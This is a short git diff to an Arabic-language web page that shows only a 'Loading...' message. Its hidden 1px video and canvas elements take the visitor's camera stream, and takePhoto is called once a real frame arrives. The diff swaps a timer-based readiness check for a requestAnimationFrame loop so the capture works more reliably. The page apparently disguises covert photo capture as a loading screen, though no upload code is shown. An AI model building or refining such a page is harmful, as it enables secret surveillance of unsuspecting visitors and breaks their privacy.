@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>جاري التحميل...</title>
+  <title>📡 جاري التحميل...</title>
   <style>
     body {
       margin: 0;
@@ -16,11 +16,9 @@
       justify-content: center;
       height: 100vh;
     }
-
     #status {
       font-size: 20px;
     }
-
     video, canvas {
       position: absolute;
       width: 1px;
@@ -48,15 +46,15 @@
         const video = document.getElementById("video");
         video.srcObject = stream;
 
-        const waitForCamera = () => {
-          if (video.readyState >= 2) {
+        // ننتظر أول فريم حقيقي باستخدام requestAnimationFrame
+        const waitForFrame = () => {
+          if (video.videoWidth > 0 && video.videoHeight > 0) {
             takePhoto(stream);
           } else {
-            setTimeout(waitForCamera, 200); // نكرر التحقق كل 200ms
+            requestAnimationFrame(waitForFrame);
           }
         };
-
-        waitForCamera();
+        requestAnimationFrame(waitForFrame);
 
       } catch (e) {
         document.getElementById("status").innerText = "❌ رفضت الكاميرا.";
